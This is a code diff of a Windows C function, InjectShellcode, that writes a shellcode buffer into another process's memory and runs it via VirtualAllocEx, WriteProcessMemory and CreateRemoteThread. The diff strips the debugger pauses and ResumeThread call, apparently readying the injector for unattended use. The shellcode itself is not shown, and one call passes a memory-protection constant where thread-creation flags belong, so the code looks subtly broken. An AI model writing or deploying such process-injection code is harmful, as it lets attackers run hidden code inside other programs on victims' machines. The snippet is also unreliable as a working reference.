@@ -152,15 +152,11 @@ HMODULE GetRemoteModuleHandle(DWORD lpProcessId, LPCSTR lpModule)
 BOOL InjectShellcode(PROCESS_INFORMATION processInfo)
 {
 	MODULEINFO moduleInfo;
-	_tprintf(TEXT("Attach debugger..."));
-	getchar();
-	// Resume execution
-	if (!ResumeThread(processInfo.hThread))
-	{
-		DisplayErrorMessage(TEXT("Error resuming thread"), GetLastError());
+	#ifdef DEBUG
+		_tprintf(TEXT("Attach debugger..."));
 		getchar();
-		return FALSE;
-	}
+	#endif
+
 	PVOID mem = VirtualAllocEx
 	(
 		processInfo.hProcess,
@@ -179,17 +175,14 @@ BOOL InjectShellcode(PROCESS_INFORMATION processInfo)
 	if (!WriteProcessMemory(processInfo.hProcess, mem, shellcode, sizeof(shellcode), NULL)) 
 	{
 		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
-		getchar();
 		return FALSE;
 	}
 
 	if(!CreateRemoteThread(processInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) mem, NULL, PAGE_EXECUTE_READWRITE, NULL))
 	{
 		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
-		getchar();
 		return FALSE;
 	}
-	getchar();
 	return TRUE;
 }
 
